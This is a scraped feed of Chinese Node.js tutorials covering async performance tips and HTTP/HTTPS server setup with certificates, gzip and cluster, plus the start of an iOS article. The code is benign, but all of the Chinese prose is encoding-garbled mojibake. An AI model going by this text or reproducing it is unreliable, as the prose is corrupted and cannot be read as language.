<p>å¤§é‡ Promise ä¼šåœ¨å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­å †ç§¯ï¼Œå¯¼è‡´ event loop å»¶è¿Ÿå¢åŠ ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {});
}
</code></pre>
<p>è¿™ä¼šè®©å¾®ä»»åŠ¡é˜Ÿåˆ—æš´æ¶¨ã€‚
ä¼˜åŒ–æ–¹æ³•ï¼š</p>
<ol>
<li>ä½¿ç”¨ setImmediate æˆ– setTimeout è®©ä»»åŠ¡è¿›å…¥å®ä»»åŠ¡é˜Ÿåˆ—</li>
<li>æ‰¹å¤„ç†ä»»åŠ¡ï¼Œå°†å¤§é‡ Promise åˆå¹¶å¤„ç†</li>
<li>é¿å…æ·±å±‚é“¾å¼ Promise</li>
</ol>
<p>è¿™å¯¹é«˜è´Ÿè½½æœåŠ¡éå¸¸é‡è¦ã€‚</p>
<hr/>
<h2 data-id="heading-7">å…«ã€ä½¿ç”¨æµï¼ˆStreamï¼‰æå‡å¤§æ–‡ä»¶å¤„ç†æ€§èƒ½</h2>
<p>å¤„ç†å¤§æ–‡ä»¶æ—¶ï¼Œä¸åº”ä½¿ç”¨ä¸€æ¬¡æ€§è¯»å–æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"bigfile"</span>);
</code></pre>
<p>åº”ä½¿ç”¨æµé€å—è¯»å–ï¼š</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">"bigfile"</span>)
  .<span class="hljs-title function_">on</span>(<span class="hljs-string">"data"</span>, <span class="hljs-function"><span class="hljs-params">chunk</span> =&gt;</span> {})
  .<span class="hljs-title function_">on</span>(<span class="hljs-string">"end"</span>, <span class="hljs-function">() =&gt;</span> {});
</code></pre>
<p>æµçš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li>å†…å­˜å ç”¨æ›´ä½</li>
<li>å¯¹äº‹ä»¶å¾ªç¯æ›´å‹å¥½</li>
<li>æ”¯æŒç®¡é“åŠ é€Ÿæ•°æ®ä¼ è¾“</li>
</ul>
<p>é€‚ç”¨äºæ—¥å¿—å¤„ç†ã€å¤§æ–‡ä»¶ä¸Šä¼ ã€è§†é¢‘è½¬ç ç­‰åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-8">ä¹ã€é¿å…å¯¹è±¡ç»“æ„ä¸ç¨³å®šå¯¼è‡´ V8 æ€§èƒ½ä¸‹é™</h2>
<p>Node.js ä½¿ç”¨ V8 å¼•æ“ï¼ŒV8 ä¾èµ–â€œéšè—ç±»â€ä¼˜åŒ–å¯¹è±¡æ€§èƒ½ã€‚
åœ¨å¤§é‡å¯¹è±¡å¤„ç†ä¸­ï¼Œå¦‚æœé¢‘ç¹æ”¹å˜ç»“æ„ï¼Œæ€§èƒ½ä¼šæ˜¾è‘—ä¸‹é™ã€‚</p>
<p>é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js">obj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>;
<span class="hljs-keyword">delete</span> obj.<span class="hljs-property">a</span>;
obj.<span class="hljs-property">b</span> = <span class="hljs-number">2</span>;
</code></pre>
<p>ä¼˜åŒ–æ–¹å¼ï¼š</p>
<ul>
<li>ä¿æŒå¯¹è±¡ç»“æ„ç¨³å®š</li>
<li>ç»Ÿä¸€åˆå§‹åŒ–å­—æ®µ</li>
<li>é¿å… deleteï¼Œä½¿ç”¨ undefined æ›¿ä»£</li>
</ul>
<p>è¿™ç±»ä¼˜åŒ–åœ¨çº¿ä¸Šé«˜æ€§èƒ½æœåŠ¡ä¸­éå¸¸é‡è¦ã€‚</p>
<hr/>
<h2 data-id="heading-9">åã€æ€»ç»“ï¼šé«˜æ€§èƒ½å¼‚æ­¥ä»£ç çš„å…³é”®è¦ç‚¹</h2>
<ol>
<li>é¿å…é˜»å¡äº‹ä»¶å¾ªç¯</li>
<li>ä½¿ç”¨å¼‚æ­¥ APIï¼Œè€Œä¸æ˜¯åŒæ­¥ API</li>
<li>ä½¿ç”¨ Promise.all å¹¶å‘æ‰§è¡Œç‹¬ç«‹ä»»åŠ¡</li>
<li>ä½¿ç”¨å¹¶å‘æ± æ§åˆ¶å¤§é‡ä»»åŠ¡</li>
<li>CPU å¯†é›†ä»»åŠ¡äº¤ç»™ worker_threads</li>
<li>å¤§æ–‡ä»¶ä½¿ç”¨ Stream å¤„ç†</li>
<li>å‡å°‘è¿‡å¤š microtask çš„å †ç§¯</li>
<li>ä¿æŒå¯¹è±¡ç»“æ„ç¨³å®š</li>
</ol>
<p>æŒæ¡è¿™äº›ç­–ç•¥ï¼Œæ‰èƒ½çœŸæ­£å‘æŒ¥ Node.js å¼‚æ­¥æ¶æ„çš„ä¼˜åŠ¿ï¼Œæ„å»ºé«˜ååé‡ã€é«˜ç¨³å®šæ€§çš„æœåŠ¡ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šåˆ›å»º HTTP/HTTPS æœåŠ¡å™¨å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7582149417769304114</link>    <guid>https://juejin.cn/post/7582149417769304114</guid>    <pubDate>2025-12-11T07:23:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582149417769304114" data-draft-id="7582182817108082714" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šåˆ›å»º HTTP/HTTPS æœåŠ¡å™¨å…¨è§£æ"/> <meta itemprop="keywords" content="åç«¯,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-11T07:23:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šåˆ›å»º HTTP/HTTPS æœåŠ¡å™¨å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:23:07.000Z" title="Thu Dec 11 2025 07:23:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>Node.js çš„æ ¸å¿ƒèƒ½åŠ›ä¹‹ä¸€å°±æ˜¯å¿«é€Ÿåˆ›å»ºé«˜æ€§èƒ½çš„æœåŠ¡å™¨ã€‚é€šè¿‡å†…ç½®çš„ <code>http</code> å’Œ <code>https</code> æ¨¡å—ï¼Œä½ å¯ä»¥åœ¨å‡ è¡Œä»£ç å†…æ­å»ºåŠŸèƒ½å®Œå–„çš„ Web æœåŠ¡ã€‚æœ¬æ–‡å°†ç³»ç»Ÿè®²è§£å¦‚ä½•åœ¨ Node.js ä¸­åˆ›å»º HTTP ä¸ HTTPS æœåŠ¡å™¨ï¼ŒåŒ…æ‹¬åŸºç¡€ç”¨æ³•ã€è¯·æ±‚å¤„ç†ã€HTTPS è¯ä¹¦é…ç½®ï¼Œä»¥åŠæ€§èƒ½ä¸å®‰å…¨ä¼˜åŒ–å®è·µã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€Node.js HTTP æœåŠ¡å™¨åŸºç¡€</h2>
<p>Node.js å†…ç½®çš„ <code>http</code> æ¨¡å—è®©åˆ›å»º HTTP æœåŠ¡å™¨éå¸¸ç®€å•ã€‚</p>
<h3 data-id="heading-1">1. åŸºæœ¬ç¤ºä¾‹</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">"http"</span>);

<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">200</span>;
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"text/plain"</span>);
  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">"Hello Node.js HTTP Server!"</span>);
});

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Server running at http://localhost:3000/"</span>);
});
</code></pre>
<p>è¯´æ˜ï¼š</p>
<ul>
<li><code>http.createServer</code> è¿”å›ä¸€ä¸ªæœåŠ¡å™¨å®ä¾‹</li>
<li>å›è°ƒå‡½æ•° <code>(req, res)</code> åœ¨æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶è§¦å‘</li>
<li><code>req</code> åŒ…å«è¯·æ±‚ä¿¡æ¯ï¼Œ<code>res</code> ç”¨äºå‘é€å“åº”</li>
<li><code>server.listen</code> ç»‘å®šç«¯å£å¹¶å¯åŠ¨æœåŠ¡å™¨</li>
</ul>
<hr/>
<h2 data-id="heading-2">äºŒã€å¤„ç†è¯·æ±‚ä¸å“åº”</h2>
<p>HTTP è¯·æ±‚åŒ…å«æ–¹æ³•ã€URLã€å¤´ä¿¡æ¯å’Œè¯·æ±‚ä½“ã€‚å“åº”ä¹Ÿå¯ä»¥è®¾ç½®çŠ¶æ€ç ã€å¤´ä¿¡æ¯åŠæ•°æ®ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">"GET"</span> &amp;&amp; req.<span class="hljs-property">url</span> === <span class="hljs-string">"/"</span>) {
    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"text/html"</span> });
    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">"&lt;h1&gt;Welcome Home&lt;/h1&gt;"</span>);
  } <span class="hljs-keyword">else</span> {
    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">404</span>, { <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"text/plain"</span> });
    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">"Page Not Found"</span>);
  }
});
</code></pre>
<p>æŠ€å·§ä¸å»ºè®®ï¼š</p>
<ul>
<li>å¯¹è¯·æ±‚è¿›è¡Œè·¯ç”±åˆ¤æ–­ï¼ŒåŒºåˆ†ä¸åŒè·¯å¾„å’Œæ–¹æ³•</li>
<li>å“åº”å¤´è¦æ ¹æ®å†…å®¹ç±»å‹è®¾ç½®</li>
<li>å¤§å‹é¡¹ç›®å¯ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¡†æ¶å¦‚ Express åšè·¯ç”±å’Œä¸­é—´ä»¶ç®¡ç†</li>
</ul>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€Node.js HTTPS æœåŠ¡å™¨</h2>
<p>åœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒHTTPS å·²ç»æ˜¯å¿…é¡»ã€‚Node.js æä¾› <code>https</code> æ¨¡å—æ”¯æŒåŠ å¯†ä¼ è¾“ã€‚</p>
<h3 data-id="heading-4">1. å‡†å¤‡è¯ä¹¦</h3>
<p>åˆ›å»º HTTPS æœåŠ¡å™¨å‰ï¼Œéœ€è¦æ‹¥æœ‰ï¼š</p>
<ul>
<li><code>key.pem</code>ï¼šç§é’¥æ–‡ä»¶</li>
<li><code>cert.pem</code>ï¼šè¯ä¹¦æ–‡ä»¶ï¼ˆå¯ä»¥ç”¨è‡ªç­¾åè¯ä¹¦åšæµ‹è¯•ï¼‰</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨ OpenSSL ç”Ÿæˆæµ‹è¯•è¯ä¹¦ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">openssl req -nodes -new -x509 -keyout key.pem -out cert.pem
</code></pre>
<hr/>
<h3 data-id="heading-5">2. åˆ›å»º HTTPS æœåŠ¡å™¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">"https"</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-keyword">const</span> options = {
  <span class="hljs-attr">key</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"key.pem"</span>),
  <span class="hljs-attr">cert</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"cert.pem"</span>)
};

<span class="hljs-keyword">const</span> server = https.<span class="hljs-title function_">createServer</span>(options, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"text/plain"</span> });
  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">"Hello Node.js HTTPS Server!"</span>);
});

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3443</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"HTTPS Server running at https://localhost:3443/"</span>);
});
</code></pre>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>HTTPS å¿…é¡»æä¾›è¯ä¹¦å’Œç§é’¥</li>
<li>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¯·ä½¿ç”¨ç”±å¯ä¿¡ CA ç­¾å‘çš„è¯ä¹¦</li>
<li>ç«¯å£ä¸€èˆ¬ä¸º 443ï¼ˆHTTP é»˜è®¤ç«¯å£ä¸º 80ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-6">å››ã€æ€§èƒ½ä¼˜åŒ–å»ºè®®</h2>
<p>è™½ç„¶ Node.js çš„ <code>http</code> å’Œ <code>https</code> æ¨¡å—è¶³å¤Ÿè½»é‡ï¼Œä½†åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œä»ç„¶å¯ä»¥ä¼˜åŒ–ï¼š</p>
<ol>
<li><strong>å¼€å¯ Keep-Alive</strong>
ä¿æŒ TCP è¿æ¥ï¼Œå‡å°‘æ¡æ‰‹å¼€é”€ï¼š</li>
</ol>
<pre><code class="hljs language-js" lang="js">res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">"Connection"</span>, <span class="hljs-string">"keep-alive"</span>);
</code></pre>
<ol start="2">
<li><strong>ä½¿ç”¨ gzip å‹ç¼©</strong>
å‡å°‘ä¼ è¾“æ•°æ®é‡ï¼Œæé«˜å“åº”é€Ÿåº¦ï¼š</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">"zlib"</span>);
res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">"Content-Encoding"</span>: <span class="hljs-string">"gzip"</span> });
res.<span class="hljs-title function_">end</span>(zlib.<span class="hljs-title function_">gzipSync</span>(<span class="hljs-string">"Hello World!"</span>));
</code></pre>
<ol start="3">
<li><strong>åˆ©ç”¨é›†ç¾¤ï¼ˆclusterï¼‰æå‡ CPU åˆ©ç”¨ç‡</strong>
Node.js å•çº¿ç¨‹æ¨¡å‹å¯ä»¥é€šè¿‡ cluster æ¨¡å—å¯åŠ¨å¤šè¿›ç¨‹ï¼š</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> cluster = <span class="hljs-built_in">require</span>(<span class="hljs-string">"cluster"</span>);
<span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">"os"</span>);

<span class="hljs-keyword">if</span> (cluster.<span class="hljs-property">isMaster</span>) {
  <span class="hljs-keyword">const</span> cpuCount = os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; cpuCount; i++) {
    cluster.<span class="hljs-title function_">fork</span>();
  }
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">// worker è¿›ç¨‹å¯åŠ¨ HTTP/HTTPS æœåŠ¡å™¨</span>
}
</code></pre>
<ol start="4">
<li><strong>ä½¿ç”¨ç¼“å­˜</strong>
å¯¹é™æ€æ–‡ä»¶æˆ–æ¥å£æ•°æ®ä½¿ç”¨å†…å­˜ç¼“å­˜æˆ– CDNï¼Œé™ä½é‡å¤è®¡ç®—å’Œ I/O å‹åŠ›ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-7">äº”ã€å¸¸è§åº”ç”¨åœºæ™¯</h2>
<ul>
<li>æ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨</li>
<li>æä¾› RESTful API æœåŠ¡</li>
<li>æ¥å…¥ WebSocket åšå®æ—¶é€šä¿¡</li>
<li>å†…ç½‘å·¥å…·æˆ–å¾®æœåŠ¡</li>
<li>HTTPS æ¥å…¥æ”¯ä»˜ã€è®¤è¯ç­‰å®‰å…¨åœºæ™¯</li>
</ul>
<p>Node.js çš„ HTTP/HTTPS æœåŠ¡å™¨èƒ½åŠ›éå¸¸é€‚åˆé«˜å¹¶å‘å’Œè½»é‡æœåŠ¡åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-8">å…­ã€æ€»ç»“</h2>
<p>é€šè¿‡æœ¬æ–‡ï¼Œä½ åº”è¯¥æŒæ¡äº†ï¼š</p>
<ol>
<li>HTTP æœåŠ¡å™¨çš„åˆ›å»ºä¸è¯·æ±‚å¤„ç†</li>
<li>HTTPS æœåŠ¡å™¨çš„è¯ä¹¦é…ç½®å’Œåˆ›å»º</li>
<li>å¼‚æ­¥è¯·æ±‚å¤„ç†ä¸å“åº”æœºåˆ¶</li>
<li>é«˜æ€§èƒ½ä¸å®‰å…¨ä¼˜åŒ–ç­–ç•¥</li>
</ol>
<p>Node.js å†…ç½®çš„ HTTP/HTTPS æ¨¡å—ç®€å•é«˜æ•ˆï¼Œéå¸¸é€‚åˆæ„å»ºé«˜æ€§èƒ½å¾®æœåŠ¡å’Œ APIã€‚
ç†è§£è¿™äº›åŸºç¡€ï¼Œä¸ºä½¿ç”¨ Expressã€Koa ç­‰æ¡†æ¶æ‰“ä¸‹äº†åšå®çš„åº•å±‚åŸºç¡€ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»éœ€æ±‚åˆ°ä¸Šæ¶ï¼Œç°ä»£ iOS å¼€å‘æµç¨‹çš„å·¥ç¨‹åŒ–æ–¹æ³•è®º]]></title>    <link>https://juejin.cn/post/7582149417769205810</link>    <guid>https://juejin.cn/post/7582149417769205810</guid>    <pubDate>2025-12-11T07:10:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582149417769205810" data-draft-id="7582202149909397513" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»éœ€æ±‚åˆ°ä¸Šæ¶ï¼Œç°ä»£ iOS å¼€å‘æµç¨‹çš„å·¥ç¨‹åŒ–æ–¹æ³•è®º"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-11T07:10:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç–¯ç‹‚çš„ç¨‹åºçŒ´"/> <meta itemprop="url" content="https://juejin.cn/user/2760245749234147"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»éœ€æ±‚åˆ°ä¸Šæ¶ï¼Œç°ä»£ iOS å¼€å‘æµç¨‹çš„å·¥ç¨‹åŒ–æ–¹æ³•è®º
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2760245749234147/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç–¯ç‹‚çš„ç¨‹åºçŒ´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:10:08.000Z" title="Thu Dec 11 2025 07:10:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
